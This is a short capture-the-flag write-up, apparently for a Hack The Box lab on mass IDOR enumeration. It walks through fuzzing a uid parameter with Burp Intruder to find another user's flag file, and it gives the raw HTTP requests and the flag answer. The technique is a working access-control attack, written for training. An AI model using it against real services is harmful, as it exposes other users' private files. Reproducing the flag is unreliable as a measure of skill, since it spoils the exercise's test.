# Mass IDOR Enumeration
## Questions
1. Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag. **Answer: HTB{4ll_f1l35_4r3_m1n3}**
   - Send this request to Intruder, start a Sniper Attack on the `uid` parameter and use Grep-Match for `.txt` to find the file containing the flag:
        ```
        POST /documents.php HTTP/1.1
        Host: 154.57.164.70:32580
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Referer: http://154.57.164.70:32580/
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 5
        Origin: http://154.57.164.70:32580
        DNT: 1
        Connection: keep-alive
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i

        uid=1
        ```
   - Found the file containing the flag and read it via IDOR:
        ```html
        <a href='/documents/flag_11dfa168ac8eb2958e38425728623c98.txt' target='_blank'>
        ```
        ```
        GET /documents/flag_11dfa168ac8eb2958e38425728623c98.txt HTTP/1.1
        ```
        ```
        HTB{4ll_f1l35_4r3_m1n3}
        ```